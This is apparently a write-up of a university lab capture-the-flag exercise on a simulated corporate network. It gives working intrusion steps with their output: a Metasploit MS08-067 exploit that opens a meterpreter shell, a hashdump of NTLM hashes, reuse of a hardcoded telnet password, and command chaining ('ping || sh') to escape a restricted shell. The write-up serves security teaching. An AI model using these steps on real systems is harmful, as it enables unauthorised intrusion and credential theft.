# Corporate Network Hacking
#### By Blankaex
## Initial Setup
Since the scenario is hacking a corporate network, we first need to gain access to the network. Fortunately we're just sitting around in the lobby and there's an unguarded ethernet port right next to us so we decide to connect and snoop around. At least, that's what it's supposed to look like. In actuality, we're connecting to a VPN. Download and untar [the provided tarball](labyrinth.unsw-seclab.sec.edu.au/openvpn.tar), then edit the port number at the end of `labyrinth.ovpn`. You can give it a port between `5001~5006`. For what it's worth, I'm on `5001` but I don't think it makes a difference. Afterwards, run the file with `openvpn`, making sure to do so as root. You can use a username of your choice. The password should be `hunter3`.

```
$ wget labyrinth.unsw-seclab.sec.edu.au/openvpn.tar
$ tar -xvf openvpn.tar
$ vim labyrinth.ovpn
$ sudo openvpn labyrinth.ovpn
username: blankaex
password: hunter3
[REDACTED]
Wed Jul 11 13:51:21 2018 Initialization Sequence Completed
```

You should be informed when the VPN is successfully initialised. You can just leave it open and begin work in another terminal. We were also given the IP address of a Kali box, `10.245.32.10`, and told that it was a _very_ default Kali install. You shouldn't have any problems guessing the root password.

```
$ ssh root@10.245.32.10
```

Now that we've successfully infiltrated the network, it's time to begin gathering information.

## Recon Stage
The first thing we want to do is explore the network and learn as much as we can. `nmap` is the perfect tool for this. We can run it on the known IP address of the Kali box to find other devices on the network. 

```
$ nmap -sV 10.245.32.10/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-11 14:40 AEST
Nmap scan report for 10.245.32.13
Host is up (0.00071s latency).
Not shown: 995 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
31337/tcp open  tcpwrapped
MAC Address: 00:00:00:00:01:01 (Xerox)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Nmap scan report for 10.245.32.98
Host is up (0.00018s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime
19/tcp   open  chargen    Linux chargen
22/tcp   open  ssh        OpenSSH 6.0p1 Debian 4+deb7u6 (protocol 2.0)
23/tcp   open  telnet     Linux telnetd
37/tcp   open  time       (32 bits)
111/tcp  open  rpcbind    2-4 (RPC #100000)
3128/tcp open  http-proxy Squid http proxy 3.1.20
MAC Address: 00:00:00:00:02:01 (Xerox)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Using `/24` allows us to test all IP addresses within the range `10.245.32.0~10.245.32.255`. Thanks to this, we've discovered two other boxes on the network (anything with an IP address above 200 or so can be disregarded; it's probably you). You can play around with the active services on the open ports if you like.

```
$ nc 10.245.32.98 7
hello world
hello world
^C
$ nc 10.245.32.98 13
11 JUL 2018 14:21:49 AEST
```

## Hacking Time
Once we've had enough fun with that, it's time to actually make use of the information we've found. The main thing to gather from this is the `microsoft-ds` service running on the `.13` box on port 445. This is [the SMB service](https://www.grc.com/port_445.htm), and I'm sure we all know how secure this protocol is. We can pretty easily go through the motions and script kiddie our way in with [CVE MS08-067](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi) using `metasploit`.

```
$ msfconsole
$ use exploit/windows/smb/ms08_067_netapi 
$ set rhost 10.245.32.13
rhost => 10.245.32.13
$ set rport 445
rport => 445
$ exploit
[*] Started reverse TCP handler on 10.245.32.10:4444
[*] 10.245.32.13:445 - Automatically detecting the target...
[*] 10.245.32.13:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.245.32.13:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.245.32.13:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.245.32.13
[*] Sleeping before handling stage...
[*] Meterpreter session 1 opened (10.245.32.10:4444 -> 10.245.32.13:1088) at 2018-07-11 14:28:58 +1000
```

This gives us a `meterpreter` shell on the XP box. We can now freely explore the file system, so we've now gained access to a lot more information. Before we start digging though, we may as well claim the flag while we're here.

```
$ cat "C:\Documents and Settings\Administrator\Desktop\flag.txt"
KCORP{[REDACTED]}
```

## More Recon
There's a pretty neat tool in `meterpreter` you can use to dump the password hashes of all users. Needless to say, this is the first step to take. Since we already have a shell, it's not entirely necessary, but doing so helps us maintain persistence and also RDP in to get a GUI (which is also not really necessary, but I find Windows is a lot more difficult to navigate on a CLI).

```
$ hashdump
Administrator:500:e3aec5bf6ae40663aad3b435b51404ee:5bf11792e028bb239f79e023ffe1f2ca:::
Erin:1004:b735063fc1a9c21ec482c03f54cdb5d9:aca699a0db2681748c775a062a0e29d7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9a4bcab4409994846d0cb2f9227bb602:e7a7ba2a5c2edfd796d346218b2cd6dc:::
Jim Rock:1003:78d866152028b45e944e2df489a880e4:746fdb64fd2e11d171d80823820969ab:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:fc9e61569461e6035492a8f55950a103:::
```

These are all NTLM hashes which can be looked up quite easily. Once you have the administrator password, you can RDP in with your favourite client (I used Remmina) and look around on the file system. The thing that caught my eye the most was the `checkproxy.py` file stored in the helpdesk.

```
$ cat "C:\helpdesk\checkproxy.py"
import os
import sys
import socket
import telnetlib
import re
import time
print "CheckProxy is currently broken. Don't use"
exit()

tn = telnetlib.Telnet("10.245.32.98")
tn.write("yOnEwsTortSm\n")
time.sleep(5)
tn.write("squidstatus 0\n")
time.sleep(5)
tn.write("exit\n")
time.sleep(5)
lines = tn.read_all()
se = re.search("\d+ instances of squid running",lines)
raw_input()
```

Reading through the script makes it quite clear that it's attempting to `telnet` into the `.98` box. Fortunately for us, the password is hardcoded into the script. The next step should be quite obvious. There's also another file, `changelog.txt` in the helpdesk which informs us of the IP address `10.245.34.77`. This is one our `nmap` scan didn't show us, so let's write it down for now.

## More Hacking
Let's go back to our Kali shell now and try to access the `.98` box.

```
$ telnet 10.245.32.98
Trying 10.245.32.98...
Connected to 10.245.32.98.
Escape character is '^]'.
Debian GNU/Linux 7
? yOnEwsTortSm
                                                                                  
                             _____ _                 _                            
                            / ____| |               | |                           
                           | |    | | ___  _   _  __| |                           
                           | |    | |/ _ \| | | |/ _` |                           
                           | |____| | (_) | |_| | (_| |                           
                            \_____|_|\___/ \__,_|\__,_|                           
                __  __ _     _     _ _                                            
               |  \/  (_)   | |   | | |                                           
               | \  / |_  __| | __| | | _____      ____ _ _ __ ___                
               | |\/| | |/ _` |/ _` | |/ _ \ \ /\ / / _` | '__/ _ \               
               | |  | | | (_| | (_| | |  __/\ V  V / (_| | | |  __/               
               |_|  |_|_|\__,_|\__,_|_|\___| \_/\_/ \__,_|_|  \___|               
                    _____                                                         
                    |  __ \                                                       
                    | |  | | __ _  ___ _ __ ___   ___  _ __                       
                    | |  | |/ _` |/ _ \ '_ ` _ \ / _ \| '_ \                      
                    | |__| | (_| |  __/ | | | | | (_) | | | |                     
                    |_____/ \__,_|\___|_| |_| |_|\___/|_| |_|                     
                                         BY SYNERGISED CYBER CLOUD PTY. LTD.      
                                                                                  
   Cloud Middleware Daemon v0.31 - INtranet Jailed Enterprise Command Terminal    
                                                                                  
                                Available Commands                                
                help - Prints available commands. i.e this message                
                         ping <HOST> - Pings a given host                         
      squidstatus <DETAIL> - Display Squid Status. DETAIL:1=full, 0=minimal       
                             hello <NAME> - Say hello                             
                            quit - Exit and disconnect                            
                            exit - Exit and disconnect                            
                    hostname - Gets the cloud proxies hostname                    
 -------------------------------------------------------------------------------- 
                            Please enter your command                             
$
```

This gives us access to a restricted shell. Of course, the obvious goal here is to gain access to a proper shell, so we need to first test what we can do. To save you the trouble, the `ping` command is vulnerable to command chaining or whatever it's called.

```
$ ping || ls -l
Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
total 80
drwxr-xr-x  2 root root  4096 Apr 18  2017 bin
drwxr-xr-x  3 root root  4096 Apr 18  2017 boot
-rw-------  1 root root     0 Apr 21  2017 dead.letter
drwxr-xr-x 13 root root  2960 Jul 10 16:01 dev
drwxr-xr-x 81 root root  4096 Jul 10 17:18 etc
drwxr-xr-x  3 root root  4096 Apr 18  2017 home
lrwxrwxrwx  1 root root    30 Apr 18  2017 initrd.img -> /boot/initrd.img-3.2.0-4-amd64
drwxr-xr-x 13 root root  4096 Apr 18  2017 lib
drwxr-xr-x  2 root root  4096 Apr 18  2017 lib64
drwx------  2 root root 16384 Apr 18  2017 lost+found
drwxr-xr-x  4 root root  4096 Apr 18  2017 media
drwxr-xr-x  2 root root  4096 Jun  3  2013 mnt
drwxr-xr-x  2 root root  4096 Apr 18  2017 opt
dr-xr-xr-x 82 root root     0 Jul 10 16:01 proc
drwx------  5 root root  4096 Jul 10 17:18 root
drwxr-xr-x 13 root root   600 Jul 10 17:19 run
drwxr-xr-x  2 root root  4096 Apr 18  2017 sbin
drwxr-xr-x  2 root root  4096 Jun 10  2012 selinux
drwxr-xr-x  2 root root  4096 Apr 18  2017 srv
drwxr-xr-x 13 root root     0 Jul 10 16:01 sys
drwxrwxrwt 20 root root  4096 Jul 11 14:17 tmp
drwxr-xr-x 10 root root  4096 Apr 18  2017 usr
drwxr-xr-x 11 root root  4096 Apr 18  2017 var
lrwxrwxrwx  1 root root    26 Apr 18  2017 vmlinuz -> boot/vmlinuz-3.2.0-4-amd64
$ ping || sh
Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
$
```

Getting the full shell is a little obscure but quite straightforward. Now that we can actually do things, we can claim the next flag.

```
$ cat /root/flag
KCORP{[REDACTED]}
```

## Recon Again
I actually haven't really looked around on this box yet. This was intentionaly left as an exercise for the reader... Apparently there's 5 boxes in total and there's three flags you can enter on the scoreboard. There's also that IP address we discovered in the helpdesk that we haven't done anything with yet, so there's definitely a lot more to do. Best of luck.
